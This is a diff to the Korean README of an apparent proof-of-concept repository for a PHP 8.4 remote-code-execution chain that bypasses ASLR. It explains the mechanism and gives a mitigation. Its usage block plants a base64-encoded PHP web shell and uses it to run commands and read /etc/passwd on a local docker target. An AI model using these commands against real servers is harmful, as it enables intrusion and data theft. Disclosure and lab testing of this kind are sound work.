@@ -1,13 +1,11 @@
 # PHP2Shell — RCE 실증 데모
 
-> CVE-2026-109618 / CVE-2026-109619 (CVSS 9.2)  
+> CVE-2026-109618 / CVE-2026-109619 (CVSS 9.2)
 > PHP 엔진 메모리 버그 → **인증 없이 원격 코드 실행**
 
 [![데모 영상 — 클릭하면 고해상도 재생](demo.gif)](https://asciinema.org/a/8QjlI2ziHVQmVcPE)
 
 한국어 | [中文](README.zh.md) | [English](readme_en.md) | [日本語](readme_ja.md)
-
----
 
 PHP의 메모리 처리 버그 2개를 연쇄(Chain D)해서, **URL 하나만 알면 서버에서 아무 명령이나 실행**할 수 있는 취약점입니다.
 
@@ -18,23 +16,20 @@ PHP의 메모리 처리 버그 2개를 연쇄(Chain D)해서, **URL 하나만 �
 > [!NOTE]
 > ### 공격에 관여하는 계층
 >
-> **Linux 커널 — ASLR**(Address Space Layout Randomization)
->
-> 프로세스가 시작될 때마다 라이브러리·힙·스택의 메모리 주소를 무작위 배치하는 OS 수준 방어입니다(`kernel.randomize_va_space=2`, 기본값 ON). `system()` 같은 함수의 주소가 매번 바뀌므로 공격자가 예측할 수 없습니다. **이 익스플로잇은 ASLR이 켜진 상태에서 작동합니다** — B1 단계에서 OOM 후 남은 stale pointer가 Set-Cookie 응답에 실려 나오면서, 공격자가 실제 메모리 주소를 알게 됩니다. 주소가 랜덤이어도 답이 유출되면 방어가 소용없습니다.
+> **Linux 커널 — ASLR** (Address Space Layout Randomization)
+> 프로세스 시작 시 라이브러리·힙·스택 주소를 무작위 배치하는 OS 방어(`kernel.randomize_va_space=2`, 기본 ON). **이 익스플로잇은 ASLR이 켜진 상태에서 작동합니다** — B1에서 OOM 후 남은 stale pointer가 Set-Cookie 응답에 실려 나와 실제 주소가 유출됩니다. 주소가 랜덤이어도 답이 유출되면 무의미합니다.
 >
 > **Apache — prefork MPM + mod_php**
->
-> prefork MPM은 요청마다 독립 프로세스를 할당하는 Apache의 다중 처리 모듈입니다. 프로세스가 분리되어 있어 A1에서 만든 stale pointer는 그 프로세스에만 존재합니다. 공격자는 나머지 워커를 점유해 4단계를 같은 프로세스로 몰아넣습니다. mod_php는 PHP가 Apache 프로세스 안에서 모듈로 실행되는 구조입니다. CGI나 FPM처럼 별도 프로세스가 아니라 Apache와 메모리 공간을 공유하므로, PHP 엔진의 heap 주소가 Apache 응답(Set-Cookie)을 통해 유출될 수 있습니다.
+> prefork는 요청마다 독립 프로세스를 할당합니다. A1에서 만든 stale pointer는 그 프로세스에만 존재하므로, 공격자는 나머지 워커를 점유해 4단계를 같은 프로세스로 몰아넣습니다. mod_php는 PHP가 Apache 프로세스 안에서 실행되는 구조라 heap 주소가 Apache 응답(Set-Cookie)을 통해 유출될 수 있습니다.
 >
 > **PHP — 설정값**
->
-> `post_max_size=8M` — POST 본문 크기 제한. 그러나 `Transfer-Encoding: chunked`로 보내면 `content_length=0`이 되어 이 검사를 건너뜁니다. 8M 제한인데 수십 MB를 밀어넣을 수 있습니다.
-> `memory_limit=128M` — 스크립트 메모리 한도. 공격자는 중첩 POST 필드로 ~22배 메모리 증폭을 일으켜 128M 안에서 OOM을 유발합니다.
-> `session.upload_progress` — 업로드 진행률 추적 기능(기본 ON). 이것이 OOM 후 stale session pointer를 남기는 원인입니다. **Off로 끄면 Chain D가 차단됩니다.**
+> - `post_max_size=8M` — `Transfer-Encoding: chunked`로 보내면 `content_length=0`이 되어 검사를 건너뜀. 수십 MB 주입 가능.
+> - `memory_limit=128M` — 중첩 POST 필드로 ~22배 증폭, 128M 안에서 OOM 유발.
+> - `session.upload_progress` (기본 ON) — OOM 후 stale session pointer를 남기는 원인. **Off로 끄면 Chain D 차단.**
 
 ## 공격 흐름 (~3초)
 
-4개의 HTTP POST 요청이 **같은 프로세스**에 순서대로 도달해야 합니다. Apache prefork는 요청마다 별도 프로세스를 배정하므로, 나머지 워커를 점유해 단일 프로세스로 고정합니다.
+4개의 HTTP POST 요청이 **같은 프로세스**에 순서대로 도달해야 합니다. 나머지 워커를 점유해 단일 프로세스로 고정합니다.
 
 ```mermaid
 %%{init: {'theme':'base', 'themeVariables': {'primaryColor':'#1a1a2e','primaryTextColor':'#fff','primaryBorderColor':'#e94560','lineColor':'#e94560','secondaryColor':'#16213e','tertiaryColor':'#0f3460','noteBkgColor':'#1a1a2e','noteTextColor':'#eee','noteBorderColor':'#e94560','actorBkg':'#e94560','actorTextColor':'#fff','actorBorder':'#e94560','activationBkgColor':'#e94560','activationBorderColor':'#c81e45','signalColor':'#eee','signalTextColor':'#1a1a2e','labelBoxBkgColor':'#16213e','labelBoxBorderColor':'#e94560','labelTextColor':'#eee','loopTextColor':'#eee','sequenceNumberColor':'#fff'}, 'sequence':{'mirrorActors':false,'messageAlign':'center','noteAlign':'center','actorMargin':140,'messageFontSize':15,'noteFontSize':14,'actorFontSize':16,'width':300}} }%%
@@ -81,23 +76,14 @@ cd php2shell-bypass-aslr-exp
 # 1. 타겟 서버 시작
 docker compose up -d
 
-# 2. 웹셸 설치 (exploit.py가 서버에 shell.php를 생성)
+# 2. 웹셸 설치
 python3 exploit.py --port 18120 --workers 150 \
   --cmd 'echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8+|base64 -d>/var/www/html/shell.php'
 
-# 3. 직접 명령 실행 — URL 하나로 서버를 조작
-curl 'http://localhost:18120/shell.php?c=whoami'
-# www-data
-
-curl 'http://localhost:18120/shell.php?c=ls -la /'
-# drwxr-xr-x  1 root root 4096 Oct 27 06:35 .
-# -rwxr-xr-x  1 root root    0 Oct 27 06:35 .dockerenv
-# ...
-
+# 3. 명령 실행
+curl 'http://localhost:18120/shell.php?c=whoami'        # www-data
+curl 'http://localhost:18120/shell.php?c=id'             # uid=33(www-data) ...
 curl 'http://localhost:18120/shell.php?c=cat /etc/passwd'
-# root:x:0:0:root:/root:/bin/bash
-# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-# ...
 
 # 4. 정리
 docker compose down
@@ -111,13 +97,13 @@ docker compose down
 | **패치** | 8.4.27+ |
 
 > [!IMPORTANT]
-> **PHP 7.4 검증 완료** — 동일 조건(prefork, memory_limit=128M, session.upload_progress=On, ASLR=2)에서 10회 시도, B1 heap leak 전부 실패(`no heap pointers in leak window`). Chain D의 heap 유출 메커니즘은 8.4의 session.upload_progress 리팩토링에 의존하며, 7.x/8.0~8.3에서는 작동하지 않습니다.
+> **PHP 7.4 검증 완료** — 동일 조건(prefork, memory_limit=128M, session.upload_progress=On, ASLR=2)에서 10회 시도, B1 heap leak 전부 실패. Chain D의 heap 유출은 8.4의 session.upload_progress 리팩토링에 의존하며, 7.x/8.0~8.3에서는 작동하지 않습니다.
 
 ## 방어
 
 ```ini
-session.upload_progress.enabled = Off   ; 즉시
-; + PHP 패치 적용                        ; 근본
+session.upload_progress.enabled = Off   ; 즉시 차단
+; + PHP 8.4.27 이상 패치 적용            ; 근본 해결
 ```
 
 ## 참고
